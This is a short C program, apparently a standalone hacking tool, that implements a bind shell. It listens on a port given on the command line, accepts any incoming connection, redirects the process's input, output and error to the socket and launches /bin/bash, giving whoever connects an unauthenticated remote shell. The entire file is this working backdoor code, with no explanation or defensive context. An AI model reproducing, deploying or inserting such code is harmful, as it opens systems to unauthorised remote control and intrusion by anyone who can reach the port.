#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include<netinet/in.h>
int main(int argc,char *argv[])
{
	if(argc<2){
		printf("example:bindshell 4444\n");
		exit(1);
	}
	int port=atol(argv[1]);
	
	struct sockaddr_in serveraddr,clnt_addr;
	int sock_fd=socket(2,1,0);
	bzero(&serveraddr,sizeof(serveraddr));
	serveraddr.sin_family=AF_INET;
	serveraddr.sin_port=htons(port);
	serveraddr.sin_addr.s_addr=inet_addr("0.0.0.0");

	bind(sock_fd,(struct sockaddr *)&serveraddr,sizeof(serveraddr));
	listen(sock_fd,20);
	socklen_t clnt_addr_size = sizeof(clnt_addr);
	char buf[0xc00];
	char *p=buf;
	int cli_fd;
	while(1){
		cli_fd=accept(sock_fd,&clnt_addr,&clnt_addr_size);
		dup2(cli_fd,0);
		dup2(cli_fd,1);
		dup2(cli_fd,2);
		execve("/bin/bash",NULL,NULL);
		close(cli_fd);
	}
	return 0;
}
